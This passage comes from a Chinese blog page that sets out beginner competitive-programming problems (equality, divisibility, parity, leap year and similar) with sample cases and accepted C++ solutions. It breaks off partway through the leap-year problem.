id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><h1 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-1"><a href="#AC-Code-1" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span>(n &amp; <span class="number">1</span>) cout &lt;&lt; <span class="number">3</span> * n + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(n % <span class="number">2</span> == <span class="number">0</span>) cout &lt;&lt; n / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="C-默契"><a href="#C-默契" class="headerlink" title="C 默契"></a>C 默契</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 262144K，其他语言524288K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h1><p>经过无数次Wa~~以后，小财终于理解了二分查找，终于可以出去玩了。<br>正好这时小金来找他玩猜数字的游戏，<br>每个人随即说出一个数字，若两数字相等输出“Tacit！”（不包括引号），否则输出“No Tacit!”（不包括引号）。</p><h1 id="输入描述-1"><a href="#输入描述-1" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>两个整数x 和 y(在int范围内)，分别代表小金和小财说出的数字。</p><h1 id="输出描述-2"><a href="#输出描述-2" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>一行，按照题目表示这两个数字的关系。</p><h1 id="示例1-2"><a href="#示例1-2" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><h1 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No Tacit!</span><br></pre></td></tr></table></figure><h1 id="示例2-2"><a href="#示例2-2" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tacit！</span><br></pre></td></tr></table></figure><h1 id="备注"><a href="#备注" class="headerlink" title="备注:"></a>备注:</h1><blockquote><p>注意输出的符号，肉眼看不到的并不代表没区别</p></blockquote><h1 id="AC-Code-2"><a href="#AC-Code-2" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    <span class="keyword">if</span> (x == y) cout &lt;&lt; <span class="string">&quot;Tacit！&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (x != y) cout &lt;&lt; <span class="string">&quot;No Tacit!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="D-整除判断"><a href="#D-整除判断" class="headerlink" title="D 整除判断"></a>D 整除判断</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 262144K，其他语言524288K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h1><p>乎乎学会了除法，他想知道整数m能否被整数n整除。</p><h1 id="输入描述-2"><a href="#输入描述-2" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入仅一行，有两个整数（范围1 ~231-1），第一个为m，第二个为n。</p><h1 id="输出描述-3"><a href="#输出描述-3" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>输出仅一行，m 能被 n 整除输出 YES，否则输出 NO。</p><h1 id="示例1-3"><a href="#示例1-3" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br></pre></td></tr></table></figure><h1 id="AC-Code-3"><a href="#AC-Code-3" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span> (m % n == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="E-CSimplemathproblem"><a href="#E-CSimplemathproblem" class="headerlink" title="E CSimplemathproblem"></a>E CSimplemathproblem</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 65536K，其他语言131072K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h1><p>这一节课，Priest给大家做了一个小测试。<br>老师给了你两个正整数X, Y。并按照一下规则做运算，求出答案Z。<br>如果X是Y的因数，则Z等于X + Y。否则Z &#x3D; Y - X。</p><h1 id="输入描述-3"><a href="#输入描述-3" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入两个正整数X, Y。  (1 &lt;&#x3D; X &lt;&#x3D; Y &lt;&#x3D; 100000000000000)。</p><h1 id="输出描述-4"><a href="#输出描述-4" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>输出你的答案Z。</p><h1 id="示例1-4"><a href="#示例1-4" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span> <span class="number">12</span></span><br></pre></td></tr></table></figure><h2 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure><h1 id="示例2-3"><a href="#示例2-3" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><h2 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><h1 id="示例3-1"><a href="#示例3-1" class="headerlink" title="示例3"></a>示例3</h1><h2 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span> <span class="number">100000000000</span></span><br></pre></td></tr></table></figure><h2 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">99999999993</span></span><br></pre></td></tr></table></figure><h1 id="AC-Code-4"><a href="#AC-Code-4" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> x, y;</span><br><span class="line">    cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">    <span class="keyword">if</span> (y % x == <span class="number">0</span>) &#123;</span><br><span class="line">        cout &lt;&lt; x + y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; y - x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="F-吃瓜群众"><a href="#F-吃瓜群众" class="headerlink" title="F 吃瓜群众"></a>F 吃瓜群众</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h1><p>群众想要吃瓜，于是给你一个瓜让你切，但是作为考验<br>告诉你西瓜的重量，问你能否将这个西瓜分成两部分，每个部分都是偶数。</p><p>注意：这里说的是能否分成两部分，不是能否平均分成两部分</p><h1 id="输入描述-4"><a href="#输入描述-4" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入一行，包含一个整数weight,表示西瓜的重量1 &lt;&#x3D; weight &lt;&#x3D; 100</p><h1 id="输出描述-5"><a href="#输出描述-5" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>输出一行，见样例。</p><h1 id="示例1-5"><a href="#示例1-5" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure><h1 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YES, you can divide the watermelon into two even parts.</span><br></pre></td></tr></table></figure><h1 id="示例2-4"><a href="#示例2-4" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NO, you can<span class="number">&#x27;</span>t divide the watermelon into two even parts.</span><br></pre></td></tr></table></figure><h1 id="备注-1"><a href="#备注-1" class="headerlink" title="备注:"></a>备注:</h1><p>要注意检查你的输出格式要跟样例输出一模一样才能通过，尤其别忘了句子最后的小点哦</p><h1 id="AC-Code-5"><a href="#AC-Code-5" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> w;</span><br><span class="line">    cin &gt;&gt; w;</span><br><span class="line">    <span class="keyword">if</span> (w % <span class="number">2</span> == <span class="number">0</span> &amp;&amp; w != <span class="number">2</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;YES, you can divide the watermelon into two even parts.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO, you can&#x27;t divide the watermelon into two even parts.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="G-jyq跳格子"><a href="#G-jyq跳格子" class="headerlink" title="G jyq跳格子"></a>G jyq跳格子</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 131072K，其他语言262144K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h1><p>担心大学生活过于苦闷，出题人决定带着大家一起玩起来！<br>当然，想要成为优秀的ccnuacmer，”简单”的脑力热身活动必不可少。</p><p>给出连续的n个格子，编号为1~n，游戏开始时，位于编号为1的格子上，每次可以任意选择跳两格或者跳四格。跳跃次数无限制。判断是否能够恰好到达终点。</p><h1 id="输入描述-5"><a href="#输入描述-5" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>一个正整数n，代表格子的数量 </p><p>1\le n \le 10000001≤n≤1000000</p><h1 id="输出描述-6"><a href="#输出描述-6" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>若可以恰好到达终点，输出n；否则输出-1；</p><h1 id="示例1-6"><a href="#示例1-6" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><h1 id="示例2-5"><a href="#示例2-5" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><h2 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure><h1 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h1><p>给出 6个格子，初始位置为  1。</p><p>第一种方案为， 第一次若选择跳两格，则此时到达位置  3。第二次若选择跳两格，则此时到达位置  5，若此时再跳两格或四格均已越出所给格子，故不合法。</p><p>第二种方案为，第一次选择跳四格，则此时到达位置  5。若此时再跳两格或四格均已越出所给格子，故不合法。</p><p>故均不能够使其恰好到达终点。</p><h1 id="示例3-2"><a href="#示例3-2" class="headerlink" title="示例3"></a>示例3</h1><h2 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="备注-2"><a href="#备注-2" class="headerlink" title="备注:"></a>备注:</h1><p>例：给出 5个格子，初始位置为 1，第一次若选择跳两格，则此时到达位置 3。第二次若选择跳两格，则此时到达位置 5。</p><h1 id="AC-Code-6"><a href="#AC-Code-6" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span>(n &amp; <span class="number">1</span>) cout &lt;&lt; n;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="H-小名的回答"><a href="#H-小名的回答" class="headerlink" title="H 小名的回答"></a>H 小名的回答</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h1><p>总算到暑假了，小姐姐是非常的闲，所以想去找梅溪湖的小名玩，可是她从没去过梅溪湖，所以只能凭小名告诉她的地方走，每次只能向上下左右四个方向走1步。小姐姐的坐标为(0,0)，小名在(a,b)，小姐姐有点近视，小名也有点近视。所以到了(a,b)也不一定能和小名会面，不过还好，小姐姐最后找到了小名。小姐姐想要小名知道自己来一趟是多么不容易，所以在聊天的过程中小姐姐说自己为了到这里走了n步。小名，你觉得她说的可能是真话么。有可能就输出YES,否则输出NO(如果用random的话,小姐姐觉得你好像不在意她，明年暑假就不来了)</p><h1 id="输入描述-6"><a href="#输入描述-6" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>a,b,n(-1000&lt;&#x3D;a,b&lt;&#x3D;1000,a*b&gt;0,1&lt;&#x3D;n&lt;&#x3D;2000)</p><h1 id="输出描述-7"><a href="#输出描述-7" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>“YES” or “NO”</p><h1 id="示例1-7"><a href="#示例1-7" class="headerlink" title="示例1"></a>示例1</h1><h1 id="输入-16"><a href="#输入-16" class="headerlink" title="输入"></a>输入</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="number">2</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><h1 id="输出-16"><a href="#输出-16" class="headerlink" title="输出"></a>输出</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br></pre></td></tr></table></figure><h1 id="示例2-6"><a href="#示例2-6" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-17"><a href="#输入-17" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">9</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="输出-17"><a href="#输出-17" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NO</span><br></pre></td></tr></table></figure><h1 id="AC-Code-7"><a href="#AC-Code-7" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> a, b, n;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a + b &lt;= n &amp;&amp; (n - a - b) % <span class="number">2</span> == <span class="number">0</span>) cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="I-牛妹数"><a href="#I-牛妹数" class="headerlink" title="I 牛妹数"></a>I 牛妹数</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h1><p>如果一个数是一个偶数而且大于50,我们称它为牛妹数</p><p>给你一个数,判断它是否是牛妹数</p><h1 id="输入描述-7"><a href="#输入描述-7" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入一个整数n (1 &lt;&#x3D; n &lt;&#x3D; 100)</p><h1 id="输出描述-8"><a href="#输出描述-8" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>如果是牛妹数,输出”yes”, 否则输出”no”</p><h1 id="示例1-8"><a href="#示例1-8" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-18"><a href="#输入-18" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure><h2 id="输出-18"><a href="#输出-18" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no</span><br></pre></td></tr></table></figure><h1 id="示例2-7"><a href="#示例2-7" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-19"><a href="#输入-19" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">52</span></span><br></pre></td></tr></table></figure><h2 id="输出-19"><a href="#输出-19" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><h1 id="AC-Code-8"><a href="#AC-Code-8" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">0</span> &amp;&amp; n &gt; <span class="number">50</span>) cout &lt;&lt; <span class="string">&quot;yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="J-判断闰年"><a href="#J-判断闰年" class="headerlink" title="J 判断闰年"></a>J 判断闰年</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 32768K，其他语言65536K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h1><p>判断一个整数n是否是闰年</p><h1 id="输入描述-8"><a href="#输入描述-8" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>输入一个整数n （1≤n≤2018）</p><h1 id="输出描述-9"><a href="#输出描述-9" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>是闰年输出”yes” 否则输出”no”</p><h1 id="示例1-9"><a href="#示例1-9" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-20"><a href="#输入-20" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 